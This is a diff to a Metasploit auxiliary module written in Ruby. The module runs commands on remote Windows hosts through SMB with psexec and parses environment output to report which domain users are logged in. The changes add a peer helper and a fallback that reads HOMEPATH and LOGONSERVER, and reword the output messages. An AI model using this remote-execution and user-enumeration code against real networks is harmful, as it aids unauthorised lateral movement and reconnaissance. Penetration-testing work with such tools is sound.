@@ -46,6 +46,12 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
+	def peer
+		return "#{rhost}:#{rport}"
+	end
+
+
+
 	# This is the main controller function
 	def run_host(ip)
 		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
@@ -122,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
 			simple.connect(smbshare)
 			psexec(smbshare, command)
 			if output = get_output(ip, smbshare, text)
-				domain, username, dnsdomain = "","",""
+				domain, username, dnsdomain, homepath, logonserver = "","","","",""
 				# Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
 				if datastore['USERNAME'].length > 0
 					output.each_line do |line|
@@ -130,7 +136,7 @@ class Metasploit3 < Msf::Auxiliary
 						domain = line if line.include?("USERDOMAIN")
 					end
 					if domain.split(" ")[2].to_s.chomp + "\\" + username.split(" ")[2].to_s.chomp == datastore['USERNAME']
-						print_good("#{datastore['USERNAME']} logged into #{ip}")
+						print_good("#{datastore['USERNAME']} is logged into #{ip}")
 					end
 					return
 				end
@@ -138,14 +144,22 @@ class Metasploit3 < Msf::Auxiliary
 					domain = line if line.include?("USERDOMAIN")
 					username = line if line.include?("USERNAME")
 					dnsdomain = line if line.include?("USERDNSDOMAIN")
+					homepath = line if line.include?("HOMEPATH")
+					logonserver = line if line.include?("LOGONSERVER")
 				end
 				if username.length > 0 && domain.length > 0
-					print_good("#{ip} - #{domain.split(" ")[2].to_s}\\#{username.split(" ")[2].to_s}")
+					print_good("#{peer} - #{domain.split(" ")[2].to_s}\\#{username.split(" ")[2].to_s}")
+				elsif logonserver.length > 0 && homepath.length > 0
+					uname = homepath.split('\\')[homepath.split('\\').size - 1]
+					if uname.include?(".")
+						uname = uname.split(".")[0]
+					end
+					print_good("#{peer} - #{logonserver.split('\\\\')[1].chomp}\\#{uname}")
 				else
 					if username = query_session(smbshare, ip, cmd, text, bat)
-						print_good("#{ip} - #{dnsdomain.split(" ")[2].split(".")[0].to_s}\\#{username}")
+						print_good("#{peer} - #{dnsdomain.split(" ")[2].split(".")[0].to_s}\\#{username}")
 					else
-						print_status("#{ip} - Unable to determine user information for user: #{key}")
+						print_status("#{peer} - Unable to determine user information for user: #{key}")
 					end
 				end
 			else
